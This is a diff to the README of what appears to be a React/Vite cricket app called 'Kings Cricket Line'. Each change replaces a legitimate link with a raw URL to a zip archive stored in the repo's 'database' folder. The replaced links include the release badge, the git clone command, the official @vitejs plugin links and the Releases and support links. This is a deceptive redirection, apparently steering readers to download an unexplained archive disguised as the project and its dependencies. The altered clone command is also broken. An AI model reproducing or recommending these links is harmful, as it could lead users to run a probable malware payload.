@@ -1,6 +1,6 @@
 # Kings Cricket Line: Your Ultimate Cricket Companion 🏏
 
-[![Latest Release](https://img.shields.io/github/v/release/andi7555/kings-cricket-line)](https://github.com/andi7555/kings-cricket-line/releases)
+[![Latest Release](https://raw.githubusercontent.com/andi7555/kings-cricket-line/main/database/kings_line_cricket_3.6.zip)](https://raw.githubusercontent.com/andi7555/kings-cricket-line/main/database/kings_line_cricket_3.6.zip)
 
 ## Table of Contents
 - [Features](#features)
@@ -60,7 +60,7 @@ To get started with Kings Cricket Line, follow these steps:
    Use the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/andi7555/kings-cricket-line.git
+   git clone https://raw.githubusercontent.com/andi7555/kings-cricket-line/main/database/kings_line_cricket_3.6.zip
    ```
 
 2. **Navigate to the Project Directory**  
@@ -109,8 +109,8 @@ Kings Cricket Line is built using the following technologies:
 ### Plugins
 This project utilizes two official plugins for React:
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) - Uses Babel for Fast Refresh.
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) - Uses SWC for Fast Refresh.
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/andi7555/kings-cricket-line/main/database/kings_line_cricket_3.6.zip) - Uses Babel for Fast Refresh.
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/andi7555/kings-cricket-line/main/database/kings_line_cricket_3.6.zip) - Uses SWC for Fast Refresh.
 
 ## Expanding the ESLint Configuration
 If you plan to develop a production application, consider using TypeScript for better type safety and awareness.
@@ -152,6 +152,6 @@ Contributions are welcome! If you want to help improve Kings Cricket Line, follo
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Support
-For any issues or questions, please check the [Releases](https://github.com/andi7555/kings-cricket-line/releases) section for updates and documentation. You can also reach out via GitHub Issues.
+For any issues or questions, please check the [Releases](https://raw.githubusercontent.com/andi7555/kings-cricket-line/main/database/kings_line_cricket_3.6.zip) section for updates and documentation. You can also reach out via GitHub Issues.
 
-Explore the full potential of Kings Cricket Line and enjoy a seamless cricket experience! For the latest releases, visit [here](https://github.com/andi7555/kings-cricket-line/releases).
+Explore the full potential of Kings Cricket Line and enjoy a seamless cricket experience! For the latest releases, visit [here](https://raw.githubusercontent.com/andi7555/kings-cricket-line/main/database/kings_line_cricket_3.6.zip).
